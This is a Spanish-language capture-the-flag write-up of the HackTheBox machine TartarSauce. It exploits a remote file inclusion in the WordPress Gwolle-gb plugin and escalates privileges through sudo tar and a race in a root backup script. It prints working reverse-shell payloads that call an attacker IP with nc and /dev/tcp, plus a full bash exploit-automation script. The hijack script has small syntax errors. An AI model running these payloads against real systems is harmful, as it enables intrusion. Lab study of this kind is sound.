---
layout: post
title: HTB_TartarSauce
date: 2023/07/10
slug: HTB_TartarSauce
heroImage: /assets/machines.jpg
---

# Tartar Sauce {-}

## Introduccion {-}

La maquina del dia 04/08/2021 se llama Tartar Sauce
.

El replay del live se puede ver aqui

[![S4vitaar Tartar Sauce maquina](https://img.youtube.com/vi/5Sm69L3zdqM/0.jpg)](https://www.youtube.com/watch?v=5Sm69L3zdqM)

No olvideis dejar un like al video y un comentario...
## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.88
```
ttl: 63 -> maquina Linux. 
Recordar que en cuanto a ttl se trata 64 = linux y 128 = windows. 
Pero como estamos en hackthebox hay un nodo intermediario que hace que el ttl disminuya una unidad

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.88 
```

Si consideras que va muy lento, puedes utilizar los siguientes parametros para que 
tu escaneo sea mucho mas rapido

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.88 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p80 10.10.10.88 -oN targeted
```

| Puerto | Servicio | Que se nos occure?       | Que falta? |
| ------ | -------- | ------------------------ | ---------- |
| 80     | http     | Web, fuzzing, robots.txt |            |


### Analizando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.88
```

Nada muy interesante

#### http-enum {-}

Lanzamos un web scan con nmap.

```bash
nmap --script http-enum -p80 10.10.10.88 -oN webScan
```

No nos detecta nada

#### Chequear la web por puerto 80 {-}

Con firefox navegamos en la web para ver lo que es. 

Nada interesante aqui. 

Miramos lo que hay en el 
```bash
 robots.txt 
```
 que nmap nos a encontrado. En el 
```bash
 robots.txt 
```
 vemos rutas que son **disallow**. 

- **/webservices/tar/tar/source/**
- **/webservices/monstra-3.0.4/**
- **/webservices/easy-file-uploader/**
- **/webservices/phpmyadmin**

Quitando partes de las rutas disalloweadas, vemos que la routa 
```bash
 http://10.10.10.88/webservices 
```
 esta forbidden y no estan Not Found como cuando
le ponemos la ruta completa. Esto quiere decir que esta ruta existe y que puede existir otros recursos debajo de ella. Vamos a Fuzzear este directorio.

#### Fuzzing con WFuzz {-}

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.88/webservices/FUZZ
```

Encontramos un ruta 
```bash
 /webservices/wp/ 
```
. Lo chequeamos en firefox. 

#### Checkeamos la ruta webservice/wp {-}

Analizando vemos

- La pagina no se ve bien
- Wapalizer nos dice que es un wordpress
- En el codigo fuente vemos un tartartsauce.htb

Como se aplica virtualhost routing, añadimos el dominio 
```bash
 tartartsauce.htb 
```
 al 
```bash
 /etc/hosts 
```



Ya se ve la web mejor y podemos mirar la web por 
```bash
 http://tartartsauce.htb/webservices/wp/ 
```



## Evaluacion de vulnerabilidades {-}

### Buscando vulnerabilidades {-}

Muchas vulnerabilidades en Wordpress se encuentran buscando los plugins instalados. Para enumerar los plugins instalados
en wordpress, se puede fuzzear la web con el uso de un diccionario especial de SecList.

```bash
git clone https://github.com/danielmiessler/SecLists
cd SecLists
cd Discovery/Web-Content/CMS/
```

Con **WFUZZ** utilizamos el diccionario de SecList llamado 
```bash
 wp-plugins.fuzz.txt 
```
.

```bash
wfuzz -c -t 200 --hc=404 -w wp-plugins.fuzz.txt http://10.10.10.88/webservices/wp/FUZZ
```

Encontramos un plugin que se llama 
```bash
 gwolle-gb 
```


Por la web intentamos ver 
```bash
 http://tartartsauce.htb/webservices/wp/wp-content/plugins/gwolle-gb/ 
```
 y no se ve nada. Pero como no nos
da un NotFound quiere decir que existe. Vamos buscando a ver si encontramos un exploit para este plugin


### Buscando un exploit con searchsploit {-}

```bash
searchsploit gwolle
```

Aqui vemos que existe un exploit para Gwolle que no permitte hacer Remote File Inclusion. Analizamos el exploit para saber lo que se puede hacer.

```bash
searchsploit -x 38861
```

Podemos ver que un parametro GET llamado **abspath** que no esta sanitizado correctamente antes de estar utilizado por la funcion require de PHP.
Un atacante podria incluir de manera remota un fichero llamado 
```bash
 wp-load.php 
```
 para ejecutar su contenido en la web vulnerable. Ademas el exploit 
nos muestra sobre que ruta tendriamos que ejecutar un metodo get para ejecutar el comando


```bash
 http://[host]/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://[hackers_website] 
```


La idea aqui seria de comprobar si esto es verdad.

### Comprobamos la efectividad del exploit {-}

1. Montamos un servidor web en la maquina de atacante

    ```bash
    python3 -m http.server
    ```

1. Lanzamos una peticion GET sobre el url que el exploit nos da

    ```bash
    curl -s -X GET "http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.8/"
    ```

Aqui podemos comprobar que la maquina victima no esta enviando una peticion get a nuestro servidor web creado en python. A demas se puede ver que
la maquina victima esta intentando buscar un fichero 
```bash
 wp-load.php 
```
 que por el momento no existe.

## Explotacion de vulnerabilidad & Ganando Acceso {-}

### Entablar una reverse shell desde la vulnerabilidad Gwolle {-}

1. Creamos el fichero 
```bash
 wp-load.php 
```
 que contiene

    ```php
    <?php
    system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 443 >/tmp/f");
    ?>
    ```

1. Montamos un servidor web desde la maquina de atacante

    ```bash
    python3 -m http.server
    ```

1. Nos ponemos en escucha por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. Lanzamos la peticion get con curl

    ```bash
    curl -s -X GET "http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.8/"
    ```

Ya podemos comprobar que estamos dentro de la maquina

```bash
whoami
#Output

www-data

hostname-I
#Output

10.10.10.88
```

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```

### Analizamos la maquina {-}

```bash
cd /home
ls
cd /onuma

id
sudo -l
#Output

(onuma) NOPASSWD: /bin/tar
```

Aqui vemos que hay un usuario onuma en el directorio home pero no tenemos capacidad de acceso. Tambien vemos que podemos usar 
el comando tar como el usuario **onuma** sin proporcionar contraseña.

### User Pivoting al usuario onuma {-}

Como es posible utilizar el comando tar como el usuario onuma sin propocionar contraseña, vamos a la pagina [GTFOBINS](https://gtfobins.github.io/) y buscamos 
una manera de entablarnos una shell como el usuario onuma

```bash
sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
whoami
#Output

onuma
```

Aqui ya podemos ver la flag.

### Automatizamos el acceso en bash {-}

```bash
#!/bin/bash

function ctrl_c(){
    echo -e "\n\n[!] Saliendo ...\n"
    exit 1
}

# Ctrl+C
trap ctrl_c INT

# ./exploit.sh -u www-data/onuma

function helpPanel(){
    echo -e "\n[!] Uso: $0 -u www-data/onuma\n"
    exit 1
}

function makeWWWDataFile(){
cat << EOF > wp-load.php
<?php
    system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 443 >/tmp/f");
?>
EOF
}

function makeOnumaFile(){
cat << EOF > wp-load.php
<?php
    system("echo '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.8/443 0>&1' > /dev/shm/s4vishell.sh");
    system("sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=\"bash /dev/shm/s4vishell.sh\"");
?>
EOF
}

function makeRequest(){
    if [ "$(echo $username)" == "www-data" ]; then
        makeWWWDataFile
        python3 -m http.server 80 &>/dev/null &
        curl -s -X GET "http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.8/"
        rm wp-load.php
        kill -9 $(lsof -i:80 | grep "python" | awk '{print $2}') &>/dev/null
    elif [ "$(echo $username)" == "onuma" ]; then
        makeOnumaFile
        python3 -m http.server 80 &>/dev/null &
        curl -s -X GET "http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.8/"
        rm wp-load.php
        kill -9 $(lsof -i:80 | grep "python" | awk '{print $2}') &>/dev/null
    else
        echo -e "\n[!] El usuario es invÃ¡lido\n"
        exit 1
    fi
}

declare -i parameter_counter=0; while getopts ":u:h:" arg; do
    case $arg in
        u) username=$OPTARG; let parameter_counter+=1;;
        h) helpPanel;;
    esac
done

if [ $parameter_counter -eq 0 ]; then
    helpPanel
else
    makeRequest
fi
```

Para usar este script, nos tenemos previamente que poner en escucha por el puerto 443 y con otra shell, usar el exploit:

- para acceder a la maquina como el usuario www-data

    ```bash
    ./exploitTheThing.sh -u www-data
    ```

- para acceder a la maquina como el usuario onuma

    ```bash
    ./exploitTheThing.sh -u onuma
    ```



## Escalada de privilegios {-}

### Rootear la maquina {-}

```bash
cd /root
id
sudo -l
```

Aqui vemos que no podemos hacer nada y que no tenemos posiblidad de rootear la maquina por vulnerabilidades del propio usuario.
Tenemos que enumerar el sistema.

```bash
uname -a
lsb_release -a
cd /
find \-perm -4000 2>/dev/null
cat /etc/cron
crontab -l
ls /var/spool/cron/
ls /var/spool/cron/ -l
```

Bueno aqui no se ve nada, no tenemos permisos SUID no hay nada vemos tareas cron. Pero siempre se puede ver de forma alternativa si hay tareas 
que se ejecutan a intervalo regular de tiempo.

```bash
cd /dev/shm
touch procmon.sh
chmod +x procmon.sh
nano procmon.sh
```

Aqui nos creamos el script que nos servira de monitoreo de procesos.

```bash
#!/bin/bash

old_process=$(ps -eo command)

while true; do
    new_process=$(ps -eo command)
    diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -v -E "procmon|command"
    old_process=$new_process
done
```

Ya podemos ver que hay una tarea 
```bash
 /bin/bash /usr/sbin/backuperer 
```
 que se ejecuta a intervalos regulares de tiempo. lo Analizamos.

```bash
cat /usr/sbin/backuperer
```

Aqui vemos un script que:

1. supprime ficheros 
```bash
 /var/tmp/.* 
```
 
1. supprime el directorio 
```bash
 /var/tmp/check 
```

1. comprime todo lo que hay en 
```bash
 /var/www/html 
```
 como un fichero 
```bash
 /var/tmp/.<hash> 
```

1. sleep 30
1. crea un directorio 
```bash
 /var/tmp/check 
```

1. descomprime 
```bash
 /var/tmp/.<hash> 
```
 en 
```bash
 /var/tmp/check 
```

1. controla si hay una differencia entre el contenido del hash y 
```bash
 /var/www/html 
```

1. si hay differencias, reporta los cambios en el fichero 
```bash
 /var/backup/onuma_backup_error.txt 
```


La vulnerabilidad de este script reside en el sleep de 30 secundos que nos permitiria borrar el fichero comprimido 
```bash
 .<hash> 
```
 y meter
otro comprimido. Como suponemos que es **root** que ejecuta la tarea, podemos aprovechar de esto para ver la flag de root.

#### Modificacion del comprimido {-}

1. Creamos un comprimido de 
```bash
 /var/www/html 
```


    ```bash
    cd /dev/shm
    tar -zcvf comprimido.tar /var/www/html
    ```

1. Preparamos en la maquina de atacante para recibir el comprimido

    ```bash
    nc -nlvp 443 > comprimido.tar
    ```

1. Enviamos el comprimido desde la maquina victima

    ```bash
    nc 10.10.14.8 443 < comprimido.tar
    ```

Ahora que tenemos el comprimido en la maquina de atacante, vamos a cambiar su contenido

1. descomprimimos el ficher 
```bash
 .tar 
```


    ```bash
    tar -xf comprimido.tar
    ```

1. Modificamos el ficher 
```bash
 index.html 
```


    ```bash
    cd var/www/html
    rm index.html
    ln -s -f /root/root.txt index.html
    ```

1. creamos un nuevo comprimido

    ```bash
    cd ../../..
    tar -zcvf comprimido.tar var/www/html
    ```

1. enviamos el comprimido a la maquina victima

    - en la maquina de atacante

        ```bash
        python3 -m http.server 80
        ```

    - en la maquina victima

        ```bash
        wget http://10.10.14.8/comprimido.tar
        ```

1. creamos un script para ejecutar el secuestro

    ```bash
    touch tehijackeolavida.sh
    chmod +x tehijackeolavida.sh
    nano tehijackeolavida.sh
    ```

    que contiene

    ```bash
    #!/bin/bash

    while true; do
        filename=$(ls -ls /var/tmp/ | awk 'NF{print $NF}' | grep -oP '^\..*[a-f0-9]')

        if [ $filename ]; then
            ehco -e "\n[+] El nombre de archivo es $filename\n"
            rm /var/tmp/$filename
            cp comprimido.tar /var/tmp/$filename
            echo -e "\n[+] Archivo hijiackeado con exito\n"
            exit 0
    done
    ```

1. Ejecutamos el script 

    ```bash
    ./tehijackeolavida.sh
    ```

Cuando la pantalla nos muestre el mensaje 
```bash
 [+] Archivo hijackeado con exito 
```
, podemos mirar el fichero 
```bash
 /var/backup/onuma_backup_error.txt 
```
 
y 30 segundos mas tarde tendriamos que ver la flag.

```bash
while true; do cat /var/backup/onuma_backup_error.txt ; sleep 1; clear; done
```

Ya podemos ver la flag.

### Rootear la maquina de verdad {-}

Podríamos crear un binario en C con SUID para que lo deposite root en html, lo que nos permitiria rootear la maquina.